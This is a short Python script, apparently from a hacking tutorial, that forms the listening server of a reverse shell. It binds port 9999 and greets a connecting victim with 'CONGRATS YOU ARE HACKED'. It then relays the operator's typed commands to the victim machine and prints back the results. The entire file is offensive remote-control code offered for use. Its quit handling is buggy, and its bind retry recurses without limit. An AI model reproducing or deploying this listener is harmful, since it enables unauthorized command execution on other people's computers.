import socket
import sys


def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as error:
        print("socket creation error:" + str(error))


def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port:" + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as error:
        print("socket binding error:" + str(error) + "\n" + "Retrying..")
        bind_socket()


def socket_accept():
    conn, addr = s.accept()
    print("connection has been established |" + "IP:" + addr[0] + "| PORT:" + str(addr[1]))
    msg="-------CONGRATS YOU ARE HACKED -------"
    conn.send(str.encode(msg))
    send_commands(conn)
    conn.close()


def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


if __name__ == "__main__":
    create_socket()
    bind_socket()

    socket_accept()
